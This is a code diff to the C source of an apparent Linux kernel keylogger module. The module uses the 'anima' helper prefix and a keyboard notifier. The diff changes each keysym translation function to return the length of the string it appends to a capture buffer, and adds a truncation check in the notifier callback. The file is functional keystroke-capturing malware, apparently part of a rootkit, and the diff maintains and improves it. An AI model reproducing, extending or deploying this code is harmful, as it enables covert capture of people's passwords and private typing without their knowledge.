@@ -69,16 +69,16 @@ static char *mods[4] = { "<shift _>", UNKNOWN, "<ctrl _>", "<alt _>" };
  *      because it can also handle control values, and is more easily modified
  *      to support an extended ascii character set.
  */
-static void ksym_std(struct keyboard_notifier_param *ks, char *buf)
+static unsigned int ksym_std(struct keyboard_notifier_param *ks, char *buf)
 {
 	unsigned char val  = ks->value & 0x00ff;
 
 	/* ignore key-release events */
 	if (!ks->down)
-		return;
+		return 0;
 
 	/* otherwise return string representation */
-	anima_strlcat(buf, ascii[val], KEYLOGGER_BUFLEN);
+	return anima_strlcat(buf, ascii[val], KEYLOGGER_BUFLEN);
 }
 
 /*
@@ -103,22 +103,25 @@ static void ksym_std(struct keyboard_notifier_param *ks, char *buf)
  *
  * NOTE: f-keys are often handled strangely, so logging results may vary.
  */
-static void ksym_fnc(struct keyboard_notifier_param *ks, char *buf)
+static unsigned int ksym_fnc(struct keyboard_notifier_param *ks, char *buf)
 {
+	unsigned int len;
 	unsigned char val  = ks->value & 0x00ff;
 	char temp[6];
 
 	/* ignore key-release events */
 	if (!ks->down)
-		return;
+		return 0;
 
 	/* non-f-keys when the high nybble isn't zero'd */
 	if (val & 0xf0) {
-		anima_strlcat(buf, fncs[val & 0x0f], KEYLOGGER_BUFLEN);
+		len = anima_strlcat(buf, fncs[val & 0x0f], KEYLOGGER_BUFLEN);
 	} else { /* f-key otherwise */
 		anima_snprintf(temp, 6, "%s%d>", F_KEYS, ++val);
-		anima_strlcat(buf, temp, KEYLOGGER_BUFLEN);
+		len = anima_strlcat(buf, temp, KEYLOGGER_BUFLEN);
 	}
+
+	return len;
 }
 
 /*
@@ -128,20 +131,20 @@ static void ksym_fnc(struct keyboard_notifier_param *ks, char *buf)
  * usual.  For num and scroll lock though, a status indicator is inserted into
  * the resultant string.
  */
-static void ksym_loc(struct keyboard_notifier_param *ks, char *buf)
+static unsigned int ksym_loc(struct keyboard_notifier_param *ks, char *buf)
 {
-	int len;
+	unsigned int len;
 	unsigned char val  = ks->value & 0x00ff;
 	int n_lock = ks->ledstate & NLOCK_MASK;
 	int s_lock = ks->ledstate & SLOCK_MASK;
 
 	/* just in case */
 	if (val > 16)
-		return;
+		return 0;
 
 	/* ignore key-press events */
 	if (ks->down)
-		return;
+		return 0;
 
 	/* translate key symbol */
 	len = anima_strlcat(buf, locks[val], KEYLOGGER_BUFLEN);
@@ -151,6 +154,8 @@ static void ksym_loc(struct keyboard_notifier_param *ks, char *buf)
 		buf[len - 2] = n_lock ? ENABLE : DISABLE;
 	else if (val == 0x09)
 		buf[len - 2] = s_lock ? ENABLE : DISABLE;
+
+	return len;
 }
 
 /*
@@ -159,24 +164,27 @@ static void ksym_loc(struct keyboard_notifier_param *ks, char *buf)
  * whether numlock is enabled or not.  See header description for more info on
  * how ledstate is handled.
  */
-static void ksym_num(struct keyboard_notifier_param *ks, char *buf)
+static unsigned int ksym_num(struct keyboard_notifier_param *ks, char *buf)
 {
+	unsigned int len;
 	unsigned char val  = ks->value & 0x00ff;
 	int n_lock = ks->ledstate & NLOCK_MASK;
 
 	/* just in case */
 	if (val > 16)
-		return;
+		return 0;
 
 	/* ignore key-release events */
 	if (!ks->down)
-		return;
+		return 0;
 
 	/* values depend on the state of numlock */
 	if (n_lock)
-		anima_strlcat(buf, locked_nums[val], KEYLOGGER_BUFLEN);
+		len = anima_strlcat(buf, locked_nums[val], KEYLOGGER_BUFLEN);
 	else if (!n_lock)
-		anima_strlcat(buf, unlocked_nums[val], KEYLOGGER_BUFLEN);
+		len = anima_strlcat(buf, unlocked_nums[val], KEYLOGGER_BUFLEN);
+
+	return len;
 }
 
 /*
@@ -184,20 +192,20 @@ static void ksym_num(struct keyboard_notifier_param *ks, char *buf)
  * Index into the arrows character string array to obtain the appropriate string
  * for a given arrow key.  Key release events are ignored.
  */
-static void ksym_arw(struct keyboard_notifier_param *ks, char *buf)
+static unsigned int ksym_arw(struct keyboard_notifier_param *ks, char *buf)
 {
 	unsigned char val  = ks->value & 0x00ff;
 
 	/* just in case */
 	if (val > 3)
-		return;
+		return 0;
 
 	/* ignore key-release events */
 	if (!ks->down)
-		return;
+		return 0;
 
 	/* translate arrow key to string */
-	anima_strlcat(buf, arws[val], KEYLOGGER_BUFLEN);
+	return anima_strlcat(buf, arws[val], KEYLOGGER_BUFLEN);
 }
 
 /*
@@ -211,20 +219,22 @@ static void ksym_arw(struct keyboard_notifier_param *ks, char *buf)
  *      could have captured keycodes instead (each key has a completely unique
  *      keycode), but the translation process would have been more complex.
  */
-static void ksym_mod(struct keyboard_notifier_param *ks, char *buf)
+static unsigned int ksym_mod(struct keyboard_notifier_param *ks, char *buf)
 {
-	int len;
+	unsigned int len;
 	unsigned char val  = ks->value & 0x00ff;
 
 	/* just in case */
 	if (val > 3)
-		return;
+		return 0;
 
 	/* translate mod key to string */
 	len = anima_strlcat(buf, mods[val], KEYLOGGER_BUFLEN);
 
 	/* add pressure indicator */
 	buf[len - 2] = ks->down ? PRESS : RELEASE;
+
+	return len;
 }
 
 /*
@@ -235,15 +245,15 @@ static void ksym_mod(struct keyboard_notifier_param *ks, char *buf)
  * inserted into the string to indicate the NEW capslock state (e for enabled,
  * d for disabled).
  */
-static void ksym_cap(struct keyboard_notifier_param *ks, char *buf)
+static unsigned int ksym_cap(struct keyboard_notifier_param *ks, char *buf)
 {
-	int len;
+	unsigned int len;
 	unsigned char val  = ks->value & 0x00ff;
 	int c_lock = ks->shift & CLOCK_MASK;
 
 	/* ignore key-press events */
 	if (ks->down)
-		return;
+		return 0;
 
 	if (val == 0x06) {
 		/* translate mod key to string */
@@ -252,8 +262,10 @@ static void ksym_cap(struct keyboard_notifier_param *ks, char *buf)
 		/* add lock status indicator */
 		buf[len - 2] = c_lock ? ENABLE : DISABLE;
 	} else {
-		anima_strlcat(buf, UNKNOWN, KEYLOGGER_BUFLEN);
+		len = anima_strlcat(buf, UNKNOWN, KEYLOGGER_BUFLEN);
 	}
+
+	return len;
 }
 
 /*
@@ -267,8 +279,9 @@ static void ksym_cap(struct keyboard_notifier_param *ks, char *buf)
  * Returns:
  *  ni nada
  */
-void xlate_keysym(struct keyboard_notifier_param *ks_param, char *buf)
+unsigned int xlate_keysym(struct keyboard_notifier_param *ks_param, char *buf)
 {
+	unsigned int len = 0;
 	unsigned char type = ks_param->value >> 8;
 
 	/* high nybble doesn't seem to be useful */
@@ -277,36 +290,36 @@ void xlate_keysym(struct keyboard_notifier_param *ks_param, char *buf)
 	/* select appropriate translation function */
 	switch (type) {
 	case 0x0 :
-		ksym_std(ks_param, buf);
+		len = ksym_std(ks_param, buf);
 		break;
 	case 0x1 :
-		ksym_fnc(ks_param, buf);
+		len = ksym_fnc(ks_param, buf);
 		break;
 	case 0x2 :
-		ksym_loc(ks_param, buf);
+		len = ksym_loc(ks_param, buf);
 		break;
 	case 0x3 :
-		ksym_num(ks_param, buf);
+		len = ksym_num(ks_param, buf);
 		break;
 	case 0x4 :
 		break;
 	case 0x5 :
 		break;
 	case 0x6 :
-		ksym_arw(ks_param, buf);
+		len = ksym_arw(ks_param, buf);
 		break;
 	case 0x7 :
-		ksym_mod(ks_param, buf);
+		len = ksym_mod(ks_param, buf);
 		break;
 	case 0x8 :
 		break;
 	case 0x9 :
 		break;
 	case 0xa :
-		ksym_cap(ks_param, buf);
+		len = ksym_cap(ks_param, buf);
 		break;
 	case 0xb :
-		ksym_std(ks_param, buf);
+		len = ksym_std(ks_param, buf);
 		break;
 	case 0xc :
 		break;
@@ -317,16 +330,22 @@ void xlate_keysym(struct keyboard_notifier_param *ks_param, char *buf)
 	case 0xf :
 		break;
 	}
-}
 
+	return len;
+}
 
 static int
 keylogger_notifiy(struct notifier_block *nb, unsigned long kcode, void *p)
 {
+	unsigned int len;
 	struct keyboard_notifier_param *param = p;
 	
-	if (kcode == KBD_KEYSYM)
-		xlate_keysym(param, trans);
+	if (kcode == KBD_KEYSYM) {
+		len = xlate_keysym(param, trans);
+		if (len >= KEYLOGGER_BUFLEN) { /* truncated */
+			pr_debug("%s: len = %u\n", __func__, len);
+		}
+	}
 
 	return NOTIFY_OK;
 }
@@ -390,5 +409,6 @@ int keylogger_exit(void)
 	}
 
 	ksyms.unregister_keyboard_notifier(&keylogger_notifier_block);
+
 	return 0;
 }
